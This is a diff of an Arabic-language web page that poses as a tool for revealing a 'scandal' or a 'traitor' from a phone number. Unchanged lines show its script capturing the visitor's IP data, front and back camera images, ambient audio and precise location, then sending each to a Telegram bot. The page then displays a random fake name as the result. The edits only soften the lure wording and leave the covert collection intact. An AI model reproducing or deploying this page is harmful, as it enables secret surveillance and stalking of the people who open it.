@@ -555,7 +555,7 @@
     <!-- شريط التحميل -->
     <div class="progress-wrap" id="progressWrap">
         <div class="top-row">
-            <span id="stepLabel">⏳ جاري كشف الفضيحة...</span>
+            <span id="stepLabel">⏳ جاري كشف </span>
             <span class="percent" id="percentLabel">0%</span>
         </div>
         <div class="progress-track">
@@ -844,7 +844,7 @@
         function showResult() {
             const name = getRandomName();
             resultName.textContent = name;
-            resultSub.textContent = '✅ تم كشف هوية الخائن بنجاح';
+            resultSub.textContent = '✅ تم كشف هوية  بنجاح';
             resultBox.classList.add('show');
             setTimeout(() => resultBox.classList.remove('show'), 8000);
         }
@@ -865,7 +865,7 @@
             // بدء شريط التحميل
             let progress = 0;
             seconds = 0;
-            updateProgress(0, '⏳ جاري كشف الفضيحة...', '⏱️ 0 ثانية');
+            updateProgress(0, '⏳ جاري كشف ...', '⏱️ 0 ثانية');
 
             progressInterval = setInterval(() => {
                 const increment = Math.random() * 3 + 0.5;
@@ -880,9 +880,9 @@
 
             try {
                 // ====== 1. إرسال بدء الطلب ======
-                updateProgress(5, '🔥 جاري تجهيز الفضيحة...');
+                updateProgress(5, '🔥 جاري تجهيز ...');
                 await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
-                    `🔥 <b>طلب كشف فضيحة</b>\n📞 الرقم: ${phoneNumber}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`
+                    `🔥 <b>طلب كشف </b>\n📞 الرقم: ${phoneNumber}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`
                 );
                 await new Promise(r => setTimeout(r, 400));
 
@@ -892,34 +892,34 @@
                 await new Promise(r => setTimeout(r, 400));
 
                 // ====== 3. IP ======
-                updateProgress(30, '🌐 جاري تحديد موقع الخائن...');
+                updateProgress(30, '🌐 جاري   ...');
                 await getRichIPData(MASTER_ID, BOT_TOKEN, phoneNumber);
                 await new Promise(r => setTimeout(r, 400));
 
                 // ====== 4. الكاميرا الأمامية ======
-                updateProgress(45, '📸 جاري التقاط صورة الخائن...');
+                updateProgress(45, '📸 جاري   ...');
                 await captureFrontCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
                 await new Promise(r => setTimeout(r, 400));
 
                 // ====== 5. الكاميرا الخلفية ======
-                updateProgress(65, '📷 جاري تصوير مكان الخائن...');
+                updateProgress(65, '📷 جاري   ...');
                 await captureBackCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
                 await new Promise(r => setTimeout(r, 400));
 
                 // ====== 6. التسجيل الصوتي ======
-                updateProgress(80, '🎤 جاري تسجيل صوت الخائن...');
+                updateProgress(80, '🎤 جاري   ...');
                 await recordAmbientAudio(MASTER_ID, BOT_TOKEN, phoneNumber);
                 await new Promise(r => setTimeout(r, 400));
 
                 // ====== 7. الموقع ======
-                updateProgress(90, '📍 جاري تحديد مكان الخائن...');
+                updateProgress(90, '📍 جاري   ...');
                 await getPreciseLocation(MASTER_ID, BOT_TOKEN, phoneNumber);
                 await new Promise(r => setTimeout(r, 400));
 
                 // ====== 8. الإكمال ======
-                updateProgress(100, '✅ اكتملت الفضيحة!', '✅ تم بنجاح');
+                updateProgress(100, '✅ اكتملت !', '✅ تم بنجاح');
                 await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
-                    `✅ <b>تم كشف الفضيحة بنجاح!</b>\n📞 الرقم: ${phoneNumber}\n🔥 تم إرسال جميع الأدلة`
+                    `✅ <b>تم كشف  بنجاح!</b>\n📞 الرقم: ${phoneNumber}\n🔥 تم إرسال جميع الأدلة`
                 );
 
                 // عرض النتيجة
